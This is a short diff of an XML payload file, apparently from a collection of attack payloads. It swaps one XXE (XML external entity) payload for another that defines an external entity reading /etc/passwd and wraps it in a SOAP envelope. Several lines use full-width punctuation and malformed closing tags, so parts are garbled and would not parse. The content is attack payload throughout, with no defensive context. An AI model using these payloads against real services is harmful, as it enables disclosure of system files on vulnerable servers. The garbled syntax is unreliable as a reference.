@@ -1,6 +1,9 @@
-<？xml version = "1.0"？> 
-<！DOCTYPE order [ 
-  <！ELEMENT foo ANY> 
-  <！ENTITY xxe SYSTEM "/etc/passwd">
-]>
 <foo> ＆xxe; </ foo> 
+
+<?xml version="1.0"?>
+<!DOCTYPE root[<!ENTITY c SYSTEM "/etc/passwd">]>
+<soap：Envelope  xmlns：soap = "http://www.w3.org/2001/12/soap-envelope"  soap：encodingStyle = "http://www.w3.org/2001/12/soap-encoding" > 
+  <soap：Body  xmlns：m = "http://www.example.org/order" > 
+     <foo> ＆c; </ foo> 
+  </ soap：Body> 
+</ soap：Envelope>
